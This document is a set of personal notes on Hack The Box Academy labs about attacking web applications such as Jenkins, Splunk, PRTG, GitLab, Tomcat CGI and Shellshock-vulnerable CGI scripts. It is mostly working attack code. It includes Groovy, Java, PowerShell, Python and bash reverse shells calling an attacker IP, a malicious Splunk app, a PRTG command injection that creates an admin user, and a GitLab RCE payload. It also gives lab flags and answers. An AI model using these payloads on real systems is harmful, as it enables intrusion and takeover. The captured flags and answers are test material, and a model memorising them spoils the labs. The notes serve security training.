cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

-> t0mcat_rc3_ftw!
```

#### Jenkins - Discovery & Enumeration
```
## Discovery/Footprinting
- Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers

## Enumeration
- Go to page:
http://jenkins.inlanefreight.local:8000/login

## Questions
-> Jenkin version at the bottom right: 2.303.1 (ref to ## Enumeration)
```

#### Attacking Jenkins
```
## Script Console
- Go to the script console at `http://jenkins.inlanefreight.local:8000/script` that allows you to run Apache Groovy scripts

def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

- Getting reverse shell with code below

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

		-> Or exploit/multi/http/jenkins_script_console in metasploit

- Obtaining reverse shell:
areaeric@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#

- Use a Powershell script (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and execute script:
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

- Using this Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

## Miscellaneous Vulnerabilties
- Against Jenkins version 2.137, we have [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)

## Questions
// get a revrse shell first through multiple ways (3 ways in total).

Then:

ls /var/lib/jenkins3
-> flag is called  flag. txt

cat /var/lib/jenkins3/flag.txt
-> f33ling_gr00000vy!
```

## Infrastructure/Network Monitoring Tools
```
## Discovery/Footprinting
- Runs on port 8000 by default, default credntials are admin:changeme
- nice to try common weak passwords such as admin, Welcome, Welcome1, Password123
- Nmap scans on splunk:

areaeric@htb[/htb]$ sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd

## Enumeration
- The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. 
	-> It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. 
	-> This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment.

## Questions
Go to the page https://10.129.201.50:8000/
and see the about tab on the help section on top right.
-> 8.2.2
```

#### Attacking Splunk
```
## Abusing Built-in Functionality
- We can use this https://github.com/0xjpuff/reverse_shell_splunk package to help us
- Examination of the directory structure gives the following:
areaeric@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files

	- The bin directory will have the script we run, and has the following reverse shell:

#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

- The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. 
	-> Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present

areaeric@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

- Once the files are created, we can create a tarball or `.spl` file.

areaeric@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf

- The next step is to choose `Install app from file` and upload the application

- Before uploading the malicious custom app, let's start a listener using Netcat

areaeric@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...

- On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.
	-> As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

areaeric@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

- If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. 
	-> The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
	-> e.g. rev.py

import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

## Questions
Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.

- Download the splunk file, changed config and compress it to an tar.gz file (ref ## Abusing Built-in functionality):
tar -cvzf updater.tar.gz reverse_shell_splunk/

- Start listenr:
sudo nc -lnvp 443

- install the tar file through the apps section:
apps -> manage apps -> install apps from file

- obtain reverse shell and execution
dir C:\loot

more C:\loot\flag.txt
```

#### PRTG Network Monitor
```
## Discovery/Footprinting/Enumeration
- We can quickly discover PRTG from an Nmap scan.
	-> It can typically be found on common web ports such as 80, 443, or 8080. 
	-> It is possible to change the web interface port in the Setup section when logged in as an admin.

areaeric@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
	-> From the Nmap scan above, we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.

	-> PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials `prtgadmin:prtgadmin`

- From the enumeration we performed so far, it seems to be PRTG version `17.3.33.2830` and is likely vulnerable to [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39
	-> Confirming the version is indeed 17.3.33.28

areaeric@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>

- Our first attempt to log in with the default credentials fails, but a few tries later, we are in with `prtgadmin:Password123`.

## Leveraging Known Vulnerabilities
- Once logged in, we can explore a bit, but we know that this is likely vulnerable to a command injection flaw so let's get right to it
	-> To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.

	 -> Next, click on `Add new notification`.

	-> Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. 
	-> Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
	-> During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.

	-> After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

- We can use `CrackMapExec` to confirm local admin access

areaeric@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

## Questions
What version of PRTG is running on the target?
- From enumeration (ref ## Discovery/Footprinting/Enumeration)
sudo nmap -sV -p- --open -T4 10.129.201.50

curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

	-> We found the version.

Q2: Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.
After logging in with prtgadmin:Password123, we follow the section (## levergaing known vulnerabilites) and obtain local admin access.
```

#### osTicket
```
## Footprinting/Discovery/Enumeration
- Check the Eyewitness scan from earlier and noticed a screenshot of osTicket Instance
- Also, most osTicket installs will showcase the osTicket logo with the phrase `powered by` in front of it in the page's footer. The footer may also contain the words `Support Ticket System`
	-> An Nmap scan will just show information about the webserver, such as Apache or IIS, and will not help us footprint the application.

- `osTicket` is a web application that is highly maintained and serviced. If we look at the [CVEs](https://www.cvedetails.com/vendor/2292/Osticket.html) found over decades, we will not find many vulnerabilities and exploits that osTicket could have. 
	-> This is an excellent example to show how important it is to understand how a web application works.
	-> Even if the application is not vulnerable, it can still be used for our purposes. 

	-> User input: The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components.

	-> Processing: As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production.

	-> Solution: Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence.

## Attacking osTicket
- oTicket version 1.14.1 suffers from [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881)

- E.g. Customer Support portal
	-> If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address.

	-> This is a modified version of osTicket as an example, but we can see that an email address was provided.

	-> Now, if we log in, we can see information about the ticket and ways to post a reply. 
		If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, `940288@inlanefreight.local`, would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email.

## osTicket - Sensitive Data Exposure
- Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool [Dehashed](http://dehashed.com/) (for our purposes, the sample data below is fictional).

areaeric@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

	-> This dump shows cleartext passwords for two different users: `jclayton`:JulieC8765! and `kgrimes`: Fish1ng_s3ason!. At this point, we have also performed subdomain enumeration and come across several interesting ones.

	-> This dump shows cleartext passwords for two different users: `jclayton` and `kgrimes`. 
		-> At this point, we have also performed subdomain enumeration and come across several interesting ones.

areaeric@htb[/htb]$ cat ilfreight_subdomains

vpn.inlanefreight.local
support.inlanefreight.local
ns1.inlanefreight.local
mail.inlanefreight.local
apps.inlanefreight.local
ftp.inlanefreight.local
dev.inlanefreight.local
ir.inlanefreight.local
auth.inlanefreight.local
careers.inlanefreight.local
portal-stage.inlanefreight.local
dns1.inlanefreight.local
dns2.inlanefreight.local
meet.inlanefreight.local
portal-test.inlanefreight.local
home.inlanefreight.local
legacy.inlanefreight.local

	-> We browse to each subdomain and find that many are defunct, but the `support.inlanefreight.local` and `vpn.inlanefreight.local` are active and very promising.
		
		 -> `Support.inlanefreight.local` is hosting an osTicket instance, and `vpn.inlanefreight.local` is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication

		-> we try `kevin@inlanefreight.local` and get a successful login!

	-> The user `kevin` appears to be a support agent but does not have any open tickets. 
		-> Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. 
		-> Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent.
			-> Obtained the password was reset to the standard new joiner password.

## Questions
Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson .

- We log in with the credential kevin@inlanefreight.local:Fish1ng_s3ason! and dig around a bit for closed ticket (ref to ## osTicket - Sensitive Data Exposure)
	-> Found password sent from the Customer Support Agent. 
```

#### Gitlab - Discovery & Enumeration
```
## Footprinting & Discovery
- We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.

- The only way to footprint the GitLab version number in use is by browsing to the `/help` page when logged in. 
	-> If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. 
	-> If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821).

- There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).

## Enumeration
- There's not much we can do against GitLab without knowing the version number or being logged in.

- The first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting.

- Browsing to this page, we see a project called `Inlanefreight dev`.
	 ->Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.\

- Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. 
	-> In that case, we may be able to access additional data.

	-> Let's go ahead and register with the credentials `hacker:Welcome` and log in and poke around. As soon as we complete registration, we are logged in and brought to the projects dashboard page.
	
	-> If we go to the `/explore` page now, we notice that there is now an internal project `Inlanefreight website` available to us. Digging around a bit, this just seems to be a static website for the company. Suppose this were some other type of application (such as PHP). In that case, we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.

## Questions
Q1: Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?

Created an user called `hacker1:welcome123` (ref to ## Enumeration)
- then logged in to the help page -> version: 13.10.2

Q2: Find the PostgreSQL database password in the example project.
Find the PostgreSQL database password in the example project.

- Go to `explore` for the example project, followed by the examining the file, we see `**phpunit_pgsql.xml**` with username and password:
	`postgres: postgres`
```

#### Attacking Gitlab
```
## Username Enumeration
- Gitlab;s default lockout policy: 10 failed attempts result in automatic unlock after 10 minutes
- Script for performing user enumeration:

areaeric@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302

## Authenticated Remote Code Execution
- GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files.

- As this is authenticated remote code execution, we first need a valid username and password. 
	-> In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack.
	
	-> However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.

areaeric@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!


	-> we get a shell
	
areaeric@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets

## Questions
Q1: Find another valid user on the target GitLab instance.
- Ran the user enum script (ref to ## username enumeration)
python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /opt/SecLists/Usernames/cirt-default-usernames.txt
->
GitLab User Enumeration in python
[+] The username DEMO exists!

Q2: Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.
- Use the account we self-registered (ref to ## Authenticated Remote Code Execution)

python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u hacker1 -p welcome123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.16 8443 >/tmp/f '
-> achieved a shell!
```

## Common Gateway Interfaces
#### Attacking Tomcat CGI
```
## Overview
- `CVE-2019-0232` is a critical security issue that could result in remote code execution.

	-> This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled.
	
	-> An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

- In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. 

	-> It is a middleware between web servers and external information resources like databases.

- E.g. searching for books:
	-> Suppose you have a CGI script that allows users to search for books in a bookstore's catalogue. The script has two possible actions: "search by title" and "search by author."

	-> The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:

http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby

	-> Here, the `action` parameter is set to `title`, indicating that the script should search by book title. The `query` parameter specifies the search term "the great gatsby."

	-> If the user wants to search by author, they can use a similar URL:

http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

	-> By using command line arguments, the CGI script can easily switch between different search actions based on user input. This makes the script more flexible and easier to use.

	-> However, a problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. 
		
		-> This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.

## Enumeration
- Scan the target using `nmap`, this will help to pinpoint active services currently operating on the system.
	-> Nmap - Open ports

areaeric@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
	-> Here we can see that Nmap has identified `Apache Tomcat/9.0.17` running on port `8080` running.

- Finding a CGI script
	-> One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist. 
	
	-> Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` or `http://10.129.204.227:8080/cgi/FUZZ.bat` to perform fuzzing. 

-> Fuzzing extensions- .CMD

areaeric@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

	-> Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.

areaeric@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

	-> Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

Welcome to CGI, this section is not functional yet. Please return to home page.

## Exploitation
- As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

http://10.129.204.227:8080/cgi/welcome.bat?&dir

	-> Navigating to the above URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.

	-> Retrieve a list of environmental variables by calling the `set` command

	-> From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

	-> The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.

http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

## Questions
Q1: After running the URL Encoded 'whoami' payload, what user is tomcat running as?
- Run the ur;-encded version of `whoami` on the cgi and welcome.bat (ref to ## Enumeration)

http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5CWindows%5Csystem32%5Cwhoami.exe
```

#### Attacking Common Gateway Interface (CGI) Applications - Shellshock
```
## Overview
- A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. 
 
	->They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc. 
	
	-> These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.

## CGI Attacks
- Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. 
 
	-> The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. 
	
	-> It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. 
	
	-> At the time of discovery, it was a 25-year-old bug and a significant threat to companies worldwide.

## Shellshock via CGI
- The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. 

	-> Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. 
	
	-> Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.
	
	-> Let's look at a simple example where we define an environment variable and include a malicious command afterward.

$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

	-> If the system is not vulnerable, only `"not vulnerable"` will be printed.

$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable

## Hands-on Example
- Enumeration- Gobuster
	-> We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `access.cgi`.

areaeric@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]

	-> Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.

areaeric@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html

- Confirming the vulnerability
	-> To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field.
	
	->Here we can see that the contents of the `/etc/passwd` file are returned to us, thus confirming the vulnerability via the user-agent field.
```shell-session
areaeric@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

- Exploitation to Reverse Shell Accesss
	-> Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways.
	-> In this example, we use a simple Bash one-liner and get a callback on our Netcat listener. 

areaeric@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

	-> From here, we could begin hunting for sensitive data or attempt to escalate privileges. 
	
	-> During a network penetration test, we could try to use this host to pivot further into the internal network.

areaeric@htb[/htb]$ sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id

## Questions
Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.
-> Directly Follow the ## hands-on example to obtain the flag.
```

#### Attacking Thick Client Applications / #### Exploiting Web Vulnerabilities in Thick-Client Applications
```
-> Not that relevant, so notes are skipped.

## Questions
Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.
	-> Follow the section.

Just note that we might encounter Restart-OracleService.exe and we need could pull this off later.
```

## Miscellaneous Applications
#### ColdFusion - Discovery & Enumeration
```
## Ovevrview
- ColdFusion is a programming language and a web application development platform based on Java

- ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. 
	-> It has a syntax similar to HTML, making it easy to learn for web developers. 
	
	-> CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks. 
	
	-> For instance, the `cfquery` tag can execute SQL statements to retrieve data from a database:

<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>

- Developers can then use the `cfloop` tag to iterate through the records retrieved from the database

<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
ColdFusion exposes a fair few ports by default:

|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|

-> It's important to note that default ports can be changed during installation or configuration.

```
## Enumeration
- During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:
```


| **Method**        | **Description**                                                                                                                                                                                                                             |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Port Scanning`   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically. |
| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.                                                           |
